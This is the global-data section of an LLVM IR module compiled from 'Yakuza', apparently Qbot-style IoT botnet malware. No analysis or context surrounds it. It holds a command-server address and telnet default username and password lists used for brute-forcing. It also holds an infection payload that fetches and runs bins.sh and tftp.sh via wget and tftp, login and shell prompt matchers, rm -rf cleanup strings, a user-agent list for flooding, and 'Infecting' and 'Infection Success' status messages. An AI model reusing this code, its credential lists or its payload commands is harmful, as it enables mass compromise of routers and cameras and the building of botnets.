; ModuleID = 'host/ir_O3/Yakuza.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [13 x i8] c"127.0.0.1:23\00", align 1
@payload = local_unnamed_addr global i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.1, i64 0, i64 0), align 8
@.str.1 = private unnamed_addr constant [132 x i8] c"cd /tmp; wget http://127.0.0.1/bins.sh; chmod 777 *; sh bins.sh; tftp -g 127.0.0.1 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh\00", align 1
@tel_usernames = local_unnamed_addr global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"support\00default\00root\00\00", align 1
@tel_passwords = local_unnamed_addr global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [23 x i8] c"support\00default\00admin\00\00", align 1
@tempdirs = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i8* null], align 16
@.str.18 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.26 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0), i8* null], align 16
@.str.33 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* null], align 16
@.str.43 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.51 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* null], align 16
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@uagents = local_unnamed_addr global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.111, i32 0, i32 0)], align 16
@.str.54 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.56 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.57 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.58 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.59 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.60 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.61 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.62 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.65 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.66 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.67 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.69 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.70 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.71 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.72 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.73 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.74 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.75 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.76 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.77 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.78 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.79 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.80 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.83 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.84 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.86 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.87 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.88 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.89 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.90 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.91 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.93 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.94 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.95 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.96 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.97 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.98 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.99 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.100 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.101 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.102 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.104 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.105 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.106 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.107 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.108 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.109 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.110 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.111 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@.str.53 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.209 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.114 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.115 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.117 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.118 = private unnamed_addr constant [81 x i8] c"[ Yakuza ] Cleaning Device || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [75 x i8] c"[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.123 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.124 = private unnamed_addr constant [84 x i8] c"[ Yakuza ] Infection Success || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
